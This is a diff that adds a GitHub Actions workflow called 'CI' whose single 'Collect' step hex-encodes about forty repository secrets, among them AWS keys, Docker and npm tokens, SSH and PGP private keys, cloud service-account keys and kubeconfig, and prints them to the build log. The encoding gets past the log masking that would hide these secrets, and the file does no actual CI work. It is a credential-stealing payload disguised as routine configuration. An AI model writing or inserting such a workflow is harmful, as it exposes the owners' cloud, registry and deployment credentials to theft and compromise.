@@ -1,0 +1,134 @@
+name: CI
+on: [push]
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Collect
+        run: |
+          echo "[HEX_DUMP]"
+          echo "DOCKERHUB_USERNAME" | xxd -p
+          echo "${{ secrets.DOCKERHUB_USERNAME }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "DOCKERHUB_PASSWORD" | xxd -p
+          echo "${{ secrets.DOCKERHUB_PASSWORD }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "DOCKERHUB_REPOSITORY" | xxd -p
+          echo "${{ secrets.DOCKERHUB_REPOSITORY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "AWS_ACCESS_KEY_ID" | xxd -p
+          echo "${{ secrets.AWS_ACCESS_KEY_ID }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "AWS_SECRET_ACCESS_KEY" | xxd -p
+          echo "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "GH_TOKEN" | xxd -p
+          echo "${{ secrets.GH_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "DOCKER_PASSWORD" | xxd -p
+          echo "${{ secrets.DOCKER_PASSWORD }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "DOCKER_USERNAME" | xxd -p
+          echo "${{ secrets.DOCKER_USERNAME }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "API_TOKEN" | xxd -p
+          echo "${{ secrets.API_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "API_KEY" | xxd -p
+          echo "${{ secrets.API_KEY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "NPM_TOKEN" | xxd -p
+          echo "${{ secrets.NPM_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "SLACK_TOKEN" | xxd -p
+          echo "${{ secrets.SLACK_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "SSH_PRIVATE_KEY" | xxd -p
+          echo "${{ secrets.SSH_PRIVATE_KEY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "DEPLOY_KEY" | xxd -p
+          echo "${{ secrets.DEPLOY_KEY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "SONAR_TOKEN" | xxd -p
+          echo "${{ secrets.SONAR_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "CODECOV_TOKEN" | xxd -p
+          echo "${{ secrets.CODECOV_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "SENTRY_AUTH_TOKEN" | xxd -p
+          echo "${{ secrets.SENTRY_AUTH_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "DOCKER_TOKEN" | xxd -p
+          echo "${{ secrets.DOCKER_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "PAT" | xxd -p
+          echo "${{ secrets.PAT }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "GITHUB_TOKEN_VALUE" | xxd -p
+          echo "${{ secrets.GITHUB_TOKEN_VALUE }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "NODE_AUTH_TOKEN" | xxd -p
+          echo "${{ secrets.NODE_AUTH_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "SECRET_KEY" | xxd -p
+          echo "${{ secrets.SECRET_KEY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "PRIVATE_KEY" | xxd -p
+          echo "${{ secrets.PRIVATE_KEY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "DEPLOY_TOKEN" | xxd -p
+          echo "${{ secrets.DEPLOY_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "BOT_TOKEN" | xxd -p
+          echo "${{ secrets.BOT_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "TOKEN" | xxd -p
+          echo "${{ secrets.TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "SECRET" | xxd -p
+          echo "${{ secrets.SECRET }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "PASSWORD" | xxd -p
+          echo "${{ secrets.PASSWORD }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "SLACK_BOT_TOKEN" | xxd -p
+          echo "${{ secrets.SLACK_BOT_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "SLACK_WEBHOOK_URL" | xxd -p
+          echo "${{ secrets.SLACK_WEBHOOK_URL }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "PGP_PRIVATE_KEY" | xxd -p
+          echo "${{ secrets.PGP_PRIVATE_KEY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "SERVICE_ACCOUNT_KEY" | xxd -p
+          echo "${{ secrets.SERVICE_ACCOUNT_KEY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "GCLOUD_SERVICE_KEY" | xxd -p
+          echo "${{ secrets.GCLOUD_SERVICE_KEY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "GCP_SA_KEY" | xxd -p
+          echo "${{ secrets.GCP_SA_KEY }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "AZURE_CREDENTIALS" | xxd -p
+          echo "${{ secrets.AZURE_CREDENTIALS }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "DOCKERHUB_TOKEN" | xxd -p
+          echo "${{ secrets.DOCKERHUB_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "CREDENTIALS" | xxd -p
+          echo "${{ secrets.CREDENTIALS }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "REGISTRY_TOKEN" | xxd -p
+          echo "${{ secrets.REGISTRY_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "REGISTRY_PASSWORD" | xxd -p
+          echo "${{ secrets.REGISTRY_PASSWORD }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "KUBE_CONFIG" | xxd -p
+          echo "${{ secrets.KUBE_CONFIG }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "KUBERNETES_TOKEN" | xxd -p
+          echo "${{ secrets.KUBERNETES_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ""
+          echo "[HEX_END]"
